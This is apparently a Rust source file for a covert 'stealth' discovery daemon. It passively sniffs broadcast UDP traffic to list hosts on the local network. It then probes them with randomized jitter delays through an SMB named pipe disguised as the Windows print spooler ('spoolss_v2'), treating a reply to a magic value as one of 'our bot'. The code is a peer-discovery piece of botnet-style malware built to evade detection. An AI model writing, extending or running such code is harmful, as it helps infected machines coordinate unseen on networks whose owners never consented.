use pnet::datalink::{self, Channel, NetworkInterface};
use pnet::packet::{Packet, MutablePacket};
use pnet::packet::ethernet::{EthernetPacket, EtherTypes};
use pnet::packet::ipv4::Ipv4Packet;
use pnet::packet::udp::UdpPacket;
use std::collections::{HashMap, HashSet};
use std::time::{SystemTime, Instant, Duration};
use std::sync::{Arc, Mutex};
use log::{info, debug, warn};
use tokio::time::sleep;
use rand::Rng;

// OUI Constants (Allowed: Intel, Realtek, Microsoft)
const ALLOWED_OUIS: &[&[u8; 3]] = &[
    &[0x00, 0x1B, 0x21], // Intel (Example)
    &[0x00, 0xE0, 0x4C], // Realtek (Example)
    &[0x00, 0x50, 0xF2], // Microsoft (Example)
    // Add real OUIs here
];

const FILTER_PORTS: &[u16] = &[5353, 1900, 137, 67, 68];

struct TargetInfo {
    ip: String,
    mac: [u8; 6],
    last_seen: Instant,
    hits: u32,
}

pub struct ZeroNoiseDiscovery {
    shadow_map: Arc<Mutex<HashMap<String, TargetInfo>>>, // IP -> Info
}

impl ZeroNoiseDiscovery {
    pub fn new() -> Self {
        Self {
            shadow_map: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    /// Run the full Zero Noise Discovery Lifecycle
    pub async fn run_daemon(&self) {
        info!("[Stealth] Starting Zero Noise Discovery Daemon");

        // 1. Start Sniffer Background Task
        let map_clone = self.shadow_map.clone();
        std::thread::spawn(move || {
            start_sniffer(map_clone);
        });

        // 2. Periodic Analysis & Probing
        loop {
            // User Request: Random 30-90s per search cycle
            let cycle_delay = rand::thread_rng().gen_range(30..=90);
            sleep(Duration::from_secs(cycle_delay)).await; 
            self.analyze_and_probe().await;
        }
    }

    async fn analyze_and_probe(&self) {
        let targets = {
            let mut map = match self.shadow_map.lock() {
                Ok(m) => m,
                Err(_) => return,
            };
            let now = Instant::now();
            
            // Prune old entries
            map.retain(|_, v| now.duration_since(v.last_seen).as_secs() < 1200);

            // Filter Candidates (Patient Hunter: > 3 hits)
            map.iter()
                .filter(|(_, v)| v.hits >= 3)
                .map(|(k, _)| k.clone())
                .collect::<Vec<String>>()
        };

        info!("[Stealth] Analyzed Shadow Map. Candidates: {}", targets.len());

        for target in targets {
            // Small Jitter Delay (2-10s) to avoid instant spikes, but faster than before
            let delay = rand::thread_rng().gen_range(2..=10);
            info!("[Stealth] Scheduled probe for {} in {}s", target, delay);
            sleep(Duration::from_secs(delay)).await;

            if self.try_covert_handshake(&target).await {
                info!("[Stealth] SUCCESS: Found Peer at {}", target);
                // Trigger P2P Session Logic (TODO)
                break; // Found one is enough? Or keep going? User said "break".
            }
        }
    }

    #[cfg(target_os = "windows")]
    async fn try_covert_handshake(&self, ip: &str) -> bool {
        use tokio::net::windows::named_pipe::ClientOptions;
        use tokio::io::AsyncWriteExt;

        let pipe_path = format!(r"\\{}\pipe\spoolss_v2", ip);
        debug!("[Stealth] Probing Pipe: {}", pipe_path);

        match ClientOptions::new().open(&pipe_path) {
            Ok(mut client) => {
                // Shake hands
                let magic = 0xDEADBEEFu32.to_be_bytes();
                if let Err(_) = client.write_all(&magic).await {
                    return false;
                }
                // If write succeeds, we assume it's our bot.
                // Real usage would exchange keys here.
                true
            }
            Err(_) => false,
        }
    }

    #[cfg(not(target_os = "windows"))]
    async fn try_covert_handshake(&self, _ip: &str) -> bool {
        warn!("[Stealth] SMB Pipe Handshake only supported on Windows.");
        false
    }
}

fn start_sniffer(map: Arc<Mutex<HashMap<String, TargetInfo>>>) {
    // Select interface (dumb selection for now: first non-loopback)
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter()
        .filter(|iface| !iface.is_loopback() && iface.is_up() && !iface.ips.is_empty())
        .next();

    if let Some(iface) = interface {
        info!("[Stealth] Sniffing on Interface: {}", iface.name);
        
        let (_, mut rx) = match datalink::channel(&iface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => { warn!("Unhandled Channel Type"); return; },
            Err(e) => { warn!("Failed to create channel: {}", e); return; }
        };

        loop {
            match rx.next() {
                Ok(packet) => {
                    let eth = match EthernetPacket::new(packet) {
                        Some(e) => e,
                        None => continue,
                    };
                    if eth.get_ethertype() == EtherTypes::Ipv4 {
                        if let Some(ip_packet) = Ipv4Packet::new(eth.payload()) {
                            // Filter UDP Broadcasts
                            if ip_packet.get_next_level_protocol() == pnet::packet::ip::IpNextHeaderProtocols::Udp {
                                if let Some(udp) = UdpPacket::new(ip_packet.payload()) {
                                    let dest_port = udp.get_destination();
                                    if FILTER_PORTS.contains(&dest_port) {
                                        let src_ip = ip_packet.get_source().to_string();
                                        let src_mac = eth.get_source().octets();

                                        // OUI Filter (Simple Check)
                                        // TODO: Implement OUI check against ALLOWED_OUIS

                                        let mut map_lock = match map.lock() {
                                            Ok(m) => m,
                                            Err(_) => continue,
                                        };
                                        let entry = map_lock.entry(src_ip.clone()).or_insert(TargetInfo {
                                            ip: src_ip,
                                            mac: src_mac,
                                            last_seen: Instant::now(),
                                            hits: 0,
                                        });
                                        entry.last_seen = Instant::now();
                                        entry.hits += 1;
                                        
                                        // debug!("[Stealth] Shadow Map Updated: {} (Hits: {})", entry.ip, entry.hits);
                                    }
                                }
                            }
                        }
                    }
                },
                Err(_) => continue,
            }
        }
    } else {
        warn!("[Stealth] No suitable interface found for sniffing.");
    }
}
